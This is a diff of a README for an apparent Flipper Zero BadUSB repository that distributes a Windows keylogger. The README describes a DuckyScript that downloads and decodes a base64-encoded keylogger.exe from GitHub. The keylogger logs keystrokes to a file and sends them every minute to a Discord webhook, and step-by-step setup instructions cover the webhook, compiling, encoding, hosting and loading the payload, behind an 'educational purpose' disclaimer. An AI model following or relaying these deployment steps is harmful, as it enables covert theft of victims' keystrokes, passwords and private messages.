@@ -1,19 +1,24 @@
-# BadUSB - DuckyScript collection
+# This project is strictly for educational purpose
+# I am not responsible for any malicious action performed by the files in this repo
 
-# Developed by Chris 
+# Developed by Chris
 
-# For educational use and purpose only
+# Description
+  ## This is a repo designed for FlipperZero/BadUSB
+  ## This is not plug-and-play
+  ## This repo utilizes DuckyScripts, Powershell commands, Base64 encoding/decoding, PythonScripts and Discord servers
+  ## The script is a keylogger that logs the user's keystrokes into a key_logs.txt and sends the content of that file every minute to your discord server
+  ## Currently this keylogger only works for Windows devices
 
-# I am not responsible for any malicious action used by the scripts or files in this repository
+  
+# To Do
+  ## 1. Create a private discord server
+  ## 1.1 Create a text channel and add a webhook to that channel
+  ## 2. Create a GitHub Repository like mine
+  ## 3. Modify keylogger.py so that it uses YOUR webhook
+  ## 3.1 Compile it and encode the keylogger.exe through an online base64 encoder
+  ## 4. Upload the encoded file to your GitHub Repository and navigate to it and click on "RAW"
+  ## 4.1 Copy the URL and modify the keylog_encoded.txt replace the current URL and all .txt files with your URL and .txt file
+  ## 5. Open qFlipper, navigate to the SD card and the BadUSB folder and upload the keylog_encoded.txt to it
 
-# Usage: 
-##   this is a duckyscript that utilizes the github repo together with discord webhooks to download and decode a keylogger, it works with FlipperZero
-
-## NOT PLUG AND PLAY !
-## ToDo:
-###   Make sure to replace the webhook in keylogger.py with your own and upload it to your own repo
-###   Make sure to replace the encoded text file with your own updated Base64 encoded keylogger.exe after compiling it
-###   Make sure to update the github link to your own aswell as the encoded text file in the duckyscript
-###   When all changes are done, open qFlipper and move the keylog_encoded.txt into your badUSB folder on your flipper
-
-# happy hacking :)
+# Happy hacking :)
